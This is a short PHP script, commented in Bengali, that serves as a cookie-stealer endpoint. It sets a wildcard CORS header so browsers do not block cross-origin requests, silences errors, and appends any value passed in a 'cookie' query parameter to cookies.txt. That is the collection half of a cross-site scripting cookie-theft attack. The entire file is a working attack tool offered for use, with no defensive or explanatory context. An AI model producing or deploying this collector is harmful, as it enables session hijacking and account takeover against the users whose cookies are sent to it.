<?php
error_reporting(0);
// Modern ব্রাউজারের CORS বা ক্রস-অরিজিন পলিসি ব্লক এড়ানোর জন্য হেডার সেট
header("Access-Control-Allow-Origin: *"); 

if (isset($_GET['cookie']) && !empty($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    
    // ফ্ল্যাট ফাইল মোডে cookies.txt ওপেন করা হচ্ছে
    $file = fopen("cookies.txt", "a");
    
    // শুধুমাত্র কুকি ডাটা এবং একটি নিউলাইন ব্রেক সেভ হবে
    fwrite($file, $cookie . "\n");
    fclose($file);
}
?>
